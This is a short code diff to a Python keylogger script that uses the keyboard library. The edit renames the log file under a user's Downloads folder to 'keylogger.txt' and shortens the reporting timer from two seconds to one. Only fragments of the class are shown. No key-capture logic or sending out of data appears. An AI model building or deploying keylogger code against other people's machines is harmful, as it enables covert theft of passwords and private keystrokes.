@@ -2,7 +2,7 @@ import keyboard
 import os
 from threading import Timer
 
-LOG_FILE = "C:/Users/nikilite/Downloads/lol.txt"  # specify the full path to the log file
+LOG_FILE = "C:/Users/nikilite/Downloads/keylogger.txt"  # specify the full path to the log file
 
 class Keylogger:
     def __init__(self, log_file):
@@ -36,7 +36,7 @@ class Keylogger:
             with open(self.log_file, "w", encoding="utf-8") as file:
                 file.write("")
                 
-        self.timer = Timer(interval=2, function=self.report)
+        self.timer = Timer(interval=1, function=self.report)
         self.timer.start()
 
     def start(self):
